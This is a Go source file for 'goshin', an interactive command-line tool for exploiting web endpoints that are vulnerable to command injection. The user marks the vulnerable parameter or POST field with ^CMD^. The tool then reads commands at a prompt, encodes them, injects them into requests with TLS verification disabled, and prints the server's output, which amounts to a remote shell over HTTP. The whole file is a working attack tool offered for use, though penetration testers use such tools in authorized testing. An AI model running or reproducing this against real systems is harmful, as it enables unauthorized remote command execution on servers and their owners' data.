package main

import (
	"bufio"
	"crypto/tls"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/antchfx/htmlquery"
	"github.com/chzyer/readline"
)

func init() {
	fmt.Print(`
                _____ __    ____    
    ____ _____ / ___// /_  /  _/___ 
   / __ '/ __ \\__ \/ __ \ / // __ \
  / /_/ / /_/ /__/ / / / // // / / /
  \__, /\____/____/_/ /_/___/_/ /_/ 
 /____/                 @thesubtlety  
 
`)
}

func usage() {
	fmt.Printf("Usage: %s\n", os.Args[0])
	flag.PrintDefaults()
	fmt.Printf("\nExamples\ngoshin -t http://localhost/exec?cmd=^CMD^\n")
	fmt.Printf("goshin -t http://localhost:8443/exec -data \"{'exec': '^CMD^'}\"\n")
	fmt.Printf("goshin -t https://localhost/exec?cmd=^CMD^' -H \"Authorization: Basic asdf\" -xpath '//*[@id=\"main_body\"]/div/div/pre'\n\n")
	os.Exit(1)
}

type HeaderArray []string

var (
	HeaderFlags      HeaderArray
	Verb             = "GET"
	OriginalPostData string
	Format           string
	Verbose          bool
	XpathSelector    string
)

//https://stackoverflow.com/questions/28322997/how-to-get-a-list-of-values-into-a-flag-in-golang
func (i *HeaderArray) String() string {
	return strings.Join(HeaderFlags, ", ")
}

func (i *HeaderArray) Set(value string) error {
	*i = append(*i, value)
	return nil
}

func main() {
	flag.Var(&HeaderFlags, "H", "header values, e.g. 'JSESSIONID: 1234', use additional -H for each header value")
	flag.StringVar(&OriginalPostData, "data", "", "data to be POSTed")
	flag.BoolVar(&Verbose, "v", false, "verbose mode")
	flag.StringVar(&Format, "encoding", "URL", "encoding (base64 or URL)")
	flag.StringVar(&XpathSelector, "xpath", "", "xPath selector, e.g '//*[@id=\"main_body\"]/div/div/pre'")
	q := flag.String("t", "", "target host and URL to query, vuln param should be param=^CMD^ (use ^^CMD^^ on Windows)")
	_ = flag.Bool("compressed", false, "flag ignored for ease of copy paste from browser's Copy as cURL")
	flag.Usage = usage
	flag.Parse()

	vulnQuery, err := url.Parse(*q)
	if err != nil {
		fmt.Printf("Error parsing URL: %s\n", err)
		return
	}

	if OriginalPostData != "" {
		Verb = "POST"
	}

	if *q == "" {
		fmt.Println("Target host required. Exiting...")
		return
	}

	if !(strings.Contains(*q, "^CMD^")) && !(strings.Contains(OriginalPostData, "^CMD^")) {
		fmt.Println("^CMD^ not found in URL query or postData. Exiting...")
		return
	}

	req := fmt.Sprintf("%s", vulnQuery)
	fmt.Println("Enter the command to be sent...")
	psuedoPrompt(req)
}

func makeRequest(q string, postData string) {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{
		InsecureSkipVerify: true,
	}

	client := &http.Client{
		Timeout: time.Second * 10,
	}

	req, err := http.NewRequest(Verb, q, strings.NewReader(postData))
	if err != nil {
		fmt.Printf("Error: %s\n", err)
		return
	}
	for _, v := range HeaderFlags {
		header := strings.Split(v, ":")[0]
		hValue := strings.Split(v, ":")[1]
		req.Header.Add(header, strings.TrimSpace(hValue))
	}

	dump, err := httputil.DumpRequestOut(req, true)
	if err != nil {
		fmt.Println(err)
		return
	}
	printVerbose(fmt.Sprintf("%q\n", dump))

	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("Error: %s\n", err)
		return
	}
	defer resp.Body.Close()

	printVerbose(fmt.Sprintf("Received %s", resp.Status))

	dump, err = httputil.DumpResponse(resp, true)
	if err != nil {
		fmt.Printf("Error: %s\n", err)
		return
	}
	printVerbose(fmt.Sprintf("%q\n\n", dump))

	printVerbose("Output")
	if XpathSelector != "" {
		doc, err := htmlquery.Parse(resp.Body)
		if err != nil {
			fmt.Println("Error parsing HTML, ", err)
			return
		}
		list := htmlquery.Find(doc, XpathSelector)
		for _, n := range list {
			fmt.Println(htmlquery.InnerText(n))
		}
	} else {
		scanner := bufio.NewScanner(resp.Body)
		for scanner.Scan() {
			fmt.Println(scanner.Text())
		}
		if err := scanner.Err(); err != nil {
			fmt.Println(err)
		}
	}
	return
}

//https://github.com/chzyer/readline/blob/master/example/readline-demo/readline-demo.go
var completer = readline.NewPrefixCompleter(
	readline.PcItem("mode",
		readline.PcItem("vi"),
		readline.PcItem("emacs"),
	),
	readline.PcItem("verbose",
		readline.PcItem("true"),
		readline.PcItem("false"),
	),
	readline.PcItem("exit"),
	readline.PcItem("help"),
)

func readerUsage(w io.Writer) {
	io.WriteString(w, "commands:\n")
	io.WriteString(w, completer.Tree("    "))
}

func psuedoPrompt(originalQuery string) {
	l, err := readline.NewEx(&readline.Config{
		Prompt:            "\033[31m»\033[0m ",
		HistoryFile:       "/tmp/readline.tmp",
		InterruptPrompt:   "^C",
		EOFPrompt:         "exit",
		HistorySearchFold: true,
	})
	if err != nil {
		panic(err)
	}
	defer l.Close()

	log.SetOutput(l.Stderr())
	for {
		line, err := l.Readline()
		if err == readline.ErrInterrupt {
			if len(line) == 0 {
				break
			} else {
				continue
			}
		} else if err == io.EOF {
			break
		}

		line = strings.TrimSpace(line)
		switch {
		case strings.HasPrefix(line, "mode "):
			switch line[5:] {
			case "vi":
				l.SetVimMode(true)
			case "emacs":
				l.SetVimMode(false)
			default:
				println("invalid mode:", line[5:])
			}
		case line == "mode":
			if l.IsVimMode() {
				println("current mode: vim")
			} else {
				println("current mode: emacs")
			}
		case line == "help":
			readerUsage(l.Stderr())
		case line == "verbose":
			println("verbose: ", Verbose)
		case strings.HasPrefix(line, "verbose "):
			switch line[8:] {
			case "true":
				Verbose = true
			case "false":
				Verbose = false
			}
		case line == "exit":
			goto exit
		case line == "":
		default:
			if Format == "base64" {
				line = base64.URLEncoding.EncodeToString([]byte(line))
			} else {
				line = url.QueryEscape(line)
			}
			newRequest := strings.ReplaceAll(originalQuery, "^CMD^", line)
			newPostData := strings.ReplaceAll(OriginalPostData, "^CMD^", line)
			makeRequest(newRequest, newPostData)
		}
	}
exit:
}

func printVerbose(s string) {
	if Verbose {
		fmt.Printf("[+] %s\n", s)
	}
}
